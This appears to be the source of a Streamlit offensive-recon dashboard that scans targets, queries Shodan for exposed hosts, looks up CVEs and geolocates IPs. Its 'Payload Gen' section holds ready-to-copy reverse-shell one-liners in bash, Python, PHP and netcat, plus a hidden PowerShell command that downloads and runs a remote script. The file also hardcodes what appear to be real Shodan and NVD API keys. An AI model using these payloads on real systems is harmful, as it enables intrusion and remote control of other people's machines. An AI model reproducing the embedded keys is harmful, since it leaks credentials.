import streamlit as st
import streamlit.components.v1 as components
import requests
import os
from urllib.parse import quote

# --- PAGE CONFIG ---
st.set_page_config(
    page_title="Project Watchdog",
    page_icon="🎯",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# --- JAVASCRIPT UTILITY FOR COPY ---
def copy_to_clipboard(text):
    """Custom JS trigger to copy text to clipboard."""
    escaped_text = text.replace("`", "\\`").replace("'", "\\'").replace('"', '\\"')
    copy_js = f"""
    <script>
    navigator.clipboard.writeText(`{escaped_text}`);
    </script>
    """
    components.html(copy_js, height=0, width=0)
    st.toast("Copied to clipboard!")

# --- CSS: AESTHETICS ---
st.markdown("""
    <style>
    /* Global Reset & Smoothness */
    html, body, [data-testid="stAppViewContainer"] {
        background-color: #0f1117;
        color: #e0e0e0;
        scroll-behavior: smooth;
    }

    /* Remove the annoying 'double scroll' by ensuring containers don't overflow */
    [data-testid="stVerticalBlock"] { gap: 1rem; }

    /* Hide default Streamlit chrome bits */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}

    /* Custom Scrollbar */
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: #0f1117; }
    ::-webkit-scrollbar-thumb { background: #222; border-radius: 10px; border: 2px solid #0f1117; }
    ::-webkit-scrollbar-thumb:hover { background: #00ff41; }

    /* Code styling */
    code {
        color: #00ff41 !important;
        background-color: #1a1c23 !important;
        padding: 0.2em 0.4em;
        border-radius: 4px;
    }
    pre {
        background-color: #1a1c23 !important;
        border-left: 3px solid #00ff41;
        border-radius: 8px !important;
    }

    /* Top bar Styling */
    .pw-topbar {
        position: sticky;
        top: 0;
        z-index: 999;
        background: rgba(15, 17, 23, 0.95);
        backdrop-filter: blur(12px);
        border-bottom: 1px solid rgba(0, 255, 65, 0.15);
        padding: 1rem 0;
        margin-bottom: 2rem;
    }

    .pw-title {
        font-size: 1.4rem;
        font-weight: 800;
        color: #ffffff;
        margin: 0;
        display: flex;
        align-items: center;
    }

    .pw-badge {
        display: inline-block;
        padding: 2px 8px;
        border-radius: 4px;
        background: rgba(0, 255, 65, 0.1);
        border: 1px solid #00ff41;
        color: #00ff41;
        font-size: 0.65rem;
        margin-left: 12px;
        text-transform: uppercase;
    }

    /* Cards & Hits */
    .pw-hit {
        background: #161b22;
        border: 1px solid rgba(255, 255, 255, 0.05);
        border-left: 4px solid #00ff41;
        border-radius: 12px;
        padding: 1.25rem;
        margin-bottom: 1rem;
        transition: transform 0.2s ease;
    }
    .pw-hit:hover {
        background: #1c2128;
        border-color: rgba(0, 255, 65, 0.3);
    }

    .pw-mini { color: #8b949e; font-size: 0.85rem; }

    /* Fix for janky Streamlit buttons */
    .stButton button {
        border-radius: 8px !important;
        transition: all 0.2s ease !important;
    }
    .stButton button:hover {
        border-color: #00ff41 !important;
        color: #00ff41 !important;
        box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
    }
    </style>
""", unsafe_allow_html=True)

# --- INIT STATE ---
if "page" not in st.session_state:
    st.session_state.page = "Target Control"

# --- HELPERS ---
def set_page(page_name: str):
    st.session_state.page = page_name

def render_topbar():
    with st.container():
        st.markdown(f"""
            <div class="pw-title">
                PROJECT WATCHDOG <span class="pw-badge">System Live</span>
            </div>
            <div class="pw-mini" style="margin-bottom: 1rem;">Recon dashboard • Session: {st.session_state.page}</div>
        """, unsafe_allow_html=True)

        # Updated to 3 buttons
        b1, b2, b3, b_empty = st.columns([1, 1, 1, 2])
        with b1:
            if st.button("🎯 TARGET CONTROL", use_container_width=True):
                set_page("Target Control")
                st.rerun()
        with b2:
            if st.button("🕷️ SHODAN SEARCH", use_container_width=True):
                set_page("Shodan Search")
                st.rerun()
        with b3:
            if st.button("🌐 GLOBAL INTEL", use_container_width=True):
                set_page("Global Intel")
                st.rerun()

def shodan_search(query: str, page: int = 1, key: str = ""):
    url = "https://api.shodan.io/shodan/host/search"
    params = {"key": key, "query": query, "page": page}
    r = requests.get(url, params=params, timeout=20)
    r.raise_for_status()
    return r.json()

# --- PAYLOAD DATA ---
PAYLOADS = {
    "--- Select Payload ---": "",
    "Bash Rev Shell": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
    "Python3 Rev Shell": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
    "PHP Reverse Shell": "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Netcat Traditional": "nc -e /bin/sh LHOST LPORT",
    "PowerShell IWR": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')\"",
    "Stable TTY Upgrade": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: Ctrl+Z -> stty raw -echo; fg"
}

# --- RENDER INTERFACE ---
render_topbar()
st.divider()

# --- PAGE: TARGET CONTROL ---
if st.session_state.page == "Target Control":
    col_ctrl, col_reports = st.columns([1, 1.8], gap="large")

    with col_ctrl:
        st.subheader("Target Control")
        target_input = st.text_input("RECON TARGET", placeholder="e.g. nmap.scanme.org")

        if st.button("INITIALIZE SCAN", use_container_width=True):
            if target_input:
                try:
                    safe_target = quote(target_input)
                    webhook_url = f"http://192.168.1.15:5678/webhook/scan?target={safe_target}"
                    response = requests.get(webhook_url, timeout=20)
                    st.toast("Pipeline Active" if response.status_code == 200 else "Uplink Failed")
                except Exception:
                    st.error("Connection Error")

        st.markdown("---")
        st.subheader("📝 Quick Notes")
        notes_file = "/data/notes.txt"
        if not os.path.exists("/data"): os.makedirs("/data", exist_ok=True)

        if "scratchpad_content" not in st.session_state:
            st.session_state.scratchpad_content = open(notes_file, "r").read() if os.path.exists(notes_file) else ""

        current_notes = st.text_area("SCRATCHPAD", value=st.session_state.scratchpad_content, height=250, label_visibility="collapsed")

        c_save, c_clear = st.columns(2)
        with c_save:
            if st.button("SAVE NOTES", use_container_width=True):
                with open(notes_file, "w") as f: f.write(current_notes)
                st.session_state.scratchpad_content = current_notes
                st.toast("Disk Sync Complete")
        with c_clear:
            if st.button("COPY ALL", use_container_width=True):
                copy_to_clipboard(current_notes)

        st.markdown("---")
        st.subheader("💀 Payload Gen")
        selected_payload_name = st.selectbox("SELECT PAYLOAD", list(PAYLOADS.keys()))

        if PAYLOADS[selected_payload_name]:
            cp1, cp2 = st.columns(2)
            with cp1: lhost = st.text_input("LHOST", value="192.168.1.15")
            with cp2: lport = st.text_input("LPORT", value="4444")

            final_payload = PAYLOADS[selected_payload_name].replace("LHOST", lhost).replace("LPORT", lport)
            st.code(final_payload, language="bash")
            if st.button("COPY PAYLOAD", use_container_width=True):
                copy_to_clipboard(final_payload)

    with col_reports:
        st.subheader("Intelligence Reports")
        report_dir = "/reports"

        if os.path.exists(report_dir):
            files = [f for f in os.listdir(report_dir) if f.endswith(".md")]
            files.sort(key=lambda x: os.path.getmtime(os.path.join(report_dir, x)), reverse=True)

            if files:
                selected_file = st.selectbox("SELECT LOG", files)
                if selected_file:
                    with st.container():
                        with open(os.path.join(report_dir, selected_file), "r") as f:
                            content = f.read()
                            st.markdown(content, unsafe_allow_html=True)
                            if st.button("COPY REPORT CONTENT"):
                                copy_to_clipboard(content)
            else:
                st.info("NO REPORTS FOUND.")
        else:
            st.error("REPORTS DIRECTORY NOT FOUND")

# --- PAGE: SHODAN SEARCH ---
elif st.session_state.page == "Shodan Search":
    api_key = "JAbrbxYBkbUeQqMT98SExPVc1R6GEARA"
    left, right = st.columns([1, 2], gap="large")

    with left:
        st.subheader("Parameters")
        if not api_key: st.warning("SHODAN_API_KEY NOT DETECTED")

        query = st.text_input("QUERY", placeholder='e.g. "nginx port:443"')

        with st.expander("Advanced Filters", expanded=True):
            country = st.text_input("Country (e.g. US)")
            product = st.text_input("Product (e.g. Apache)")
            page_num = st.number_input("Page", min_value=1, value=1)

        build = query.strip()
        if country: build += f" country:{country}"
        if product: build += f" product:{product}"

        st.markdown("**Active Query:**")
        st.code(build if build else "null")

        run_search = st.button("EXECUTE SEARCH", use_container_width=True, type="primary")

    with right:
        st.subheader("Results")
        if run_search:
            if not api_key: st.error("API Key Required")
            else:
                try:
                    data = shodan_search(build, page=int(page_num), key=api_key)
                    matches = data.get("matches", [])
                    st.metric("Total Matches", f"{data.get('total', 0):,}")

                    for item in matches:
                        ip = item.get("ip_str", "0.0.0.0")
                        port = item.get("port", "80")
                        with st.container():
                            st.markdown(f"""
                            <div class="pw-hit">
                                <b>{ip}:{port}</b> | {item.get('org', 'N/A')}<br>
                                <span class="pw-mini">{item.get('location', {}).get('city', 'Unknown City')}</span>
                            </div>
                            """, unsafe_allow_html=True)

                            c1, c2 = st.columns([1, 4])
                            with c1:
                                if st.button(f"Copy IP", key=f"copy_{ip}_{port}"):
                                    copy_to_clipboard(ip)
                            with c2:
                                with st.expander("Banner Data"):
                                    st.code(item.get("data", "No data")[:2000])

                except Exception as e:
                    st.error(f"Error: {e}")
        else:
            st.info("Ready for input.")

# --- PAGE: GLOBAL INTEL (UPDATED WITH KEY) ---
elif st.session_state.page == "Global Intel":
    col_v, col_g = st.columns([1, 1], gap="large")

    with col_v:
        st.subheader("🔍 NVD Vulnerability Search")
        v_query = st.text_input("PRODUCT OR CVE", placeholder="e.g. log4j")

        if v_query:
            try:
                # --- NVD API KEY INTEGRATION ---
                NVD_API_KEY = "your-api-key-here"

                nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={v_query}"
                headers = {"apiKey": "c24a7422-dcc9-4e30-99e0-7baae1ac68bb"}

                nvd_res = requests.get(nvd_url, headers=headers, timeout=15).json()

                vulns = nvd_res.get("vulnerabilities", [])
                if vulns:
                    for v in vulns[:5]:
                        c_data = v.get("cve", {})
                        cid = c_data.get("id")
                        desc = c_data.get("descriptions", [{}])[0].get("value", "N/A")

                        st.markdown(f"""
                        <div class="pw-hit">
                            <b style="color:#00ff41;">{cid}</b><br>
                            <p style="font-size:0.85rem;">{desc[:250]}...</p>
                        </div>
                        """, unsafe_allow_html=True)
                        if st.button(f"COPY {cid}", key=f"btn_{cid}"):
                            copy_to_clipboard(cid)
                else:
                    st.info("No results found.")
            except Exception as e:
                st.error(f"NVD API Error: {e}")

    with col_g:
        st.subheader("🗺️ Geo-IP Mapping")
        g_ip = st.text_input("IP ADDRESS", placeholder="8.8.8.8")

        if g_ip:
            try:
                res = requests.get(f"http://ip-api.com/json/{g_ip}").json()

                if res['status'] == 'success':
                    lat, lon = res.get('lat'), res.get('lon')
                    g_maps_url = f"https://www.google.com/maps?q={lat},{lon}"

                    st.markdown(f"""
                    <div class="pw-hit">
                        <b>ISP:</b> {res.get('isp')}<br>
                        <b>Loc:</b> {res.get('city')}, {res.get('country')}<br>
                        <b>Coords:</b> <code>{lat}, {lon}</code><br><br>
                        <a href="{g_maps_url}" target="_blank" style="color:#00ff41; text-decoration:none;">📍 VIEW ON GOOGLE MAPS</a>
                    </div>
                    """, unsafe_allow_html=True)

                    if st.button("COPY COORDINATES"):
                        copy_to_clipboard(f"{lat}, {lon}")
                else:
                    st.error("Invalid IP.")
            except Exception as e:
                st.error(f"Geo Error: {e}")
